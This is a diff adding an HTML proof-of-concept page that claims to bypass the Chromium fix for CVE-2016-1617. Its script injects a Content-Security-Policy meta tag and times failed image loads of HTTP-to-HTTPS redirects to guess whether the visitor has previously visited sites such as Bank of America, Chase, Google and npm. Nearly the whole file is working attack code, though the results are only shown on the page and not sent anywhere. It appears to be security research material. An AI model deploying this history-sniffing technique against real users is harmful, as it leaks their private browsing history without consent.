@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSP PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 80%;
+            max-width: 800px;
+        }
+
+        h1 {
+            text-align: center;
+            color: #007BFF;
+        }
+
+        p {
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        .results {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+
+        .result-item {
+            font-size: 14px;
+            margin: 5px 0;
+            color: #555;
+        }
+
+        .result-item.success {
+            color: green;
+        }
+
+        .result-item.error {
+            color: red;
+        }
+        
+        .note {
+            font-size: 14px;
+            margin-top: 10px;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>CSP PoC - Bypassing CVE-2016-1617</h1>
+        <p>This is a Proof of Concept (PoC) for bypassing the fix for <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=544765" target="_blank">CVE-2016-1617</a>.</p>
+        <p>Results of testing CSP bypass:</p>
+
+        <div id="div_results" class="results"></div>
+
+        <p class="note">Note: The results indicate whether a URL was probably visited before or not, based on the load time of the image.</p>
+    </div>
+
+    <script>
+        // The idea of the script below comes from https://bugs.chromium.org/p/chromium/issues/attachmentText?aid=61601 by Yan Zhu
+        // The original bug report for CVE-2016-1617 is https://bugs.chromium.org/p/chromium/issues/detail?id=544765. 
+
+        // configuration variables:
+        var INT_THREASHOLD_VISITED_MILLISECOND = 10;
+        var array_domains = [
+            "www.bing.com",
+            "www.bankofamerica.com",
+            "www.google.com",
+            "www.chase.com",
+            "www.npmjs.com"
+        ];
+
+        var array_urls_that_301_redirect_to_https = [
+            "http://www.bankofamerica.com/",    // no Cache-Control
+            "http://www.google.com/",          // Cache-Control: max-age=600
+            "http://www.chase.com/",            // no Cache-Control
+            "http://www.npmjs.com/",            // non-preloaded HSTS
+        ];
+
+        // Step 1: construct <meta http-equiv="Content-Security-Policy" content="img-src http://domain1:80 http://domain2:80 ...">
+        var string_csp_content = "img-src";
+        for (var i = 0; i < array_domains.length; i++) {
+            string_csp_content += " http://" + array_domains[i] + ":80";
+        }
+        var element_meta_csp = document.createElement("meta");
+        element_meta_csp.setAttribute("http-equiv", "Content-Security-Policy");
+        element_meta_csp.setAttribute("content", string_csp_content);
+        document.getElementsByTagName("head")[0].appendChild(element_meta_csp);
+
+        // Step 2: do the test by loading img
+        var j = 0;
+        var string_this_url = array_urls_that_301_redirect_to_https[j];
+        var element_img = document.createElement("img");
+        var time_before_load = new Date();
+
+        function checkNext() {
+            j++;
+            if (j < array_urls_that_301_redirect_to_https.length) {
+                string_this_url = array_urls_that_301_redirect_to_https[j];
+                time_before_load = new Date();
+                element_img.src = string_this_url;
+            } else {
+                console.log("All finished.");
+            }
+        }
+
+        element_img.onerror = function () {
+            var time_hit_error = new Date();
+            var time_elapsed = time_hit_error - time_before_load;
+            console.log("Loading " + string_this_url + " failed now. Time elapsed: " + time_elapsed.toString());
+            
+            // Display result to user:
+            var element_div_results = document.getElementById("div_results");
+            var element_p_result = document.createElement("p");
+            element_p_result.textContent = "[" + j + "] " + string_this_url + ": ";
+            if (time_elapsed < INT_THREASHOLD_VISITED_MILLISECOND) {
+                element_p_result.classList.add("result-item", "success");
+                element_p_result.textContent += "probably visited before. Time elapsed: " + time_elapsed.toString();
+            } else {
+                element_p_result.classList.add("result-item", "error");
+                element_p_result.textContent += "probably NOT visited before. Time elapsed: " + time_elapsed.toString();
+            }
+            element_div_results.appendChild(element_p_result);
+            checkNext();
+        };
+
+        element_img.onload = function () {
+            console.log("URL: " + string_this_url + " is loaded in img tag successfully. This should never happen until bug is fixed.");
+        };
+
+        element_img.src = string_this_url;
+        
+    </script>
+</body>
+</html>
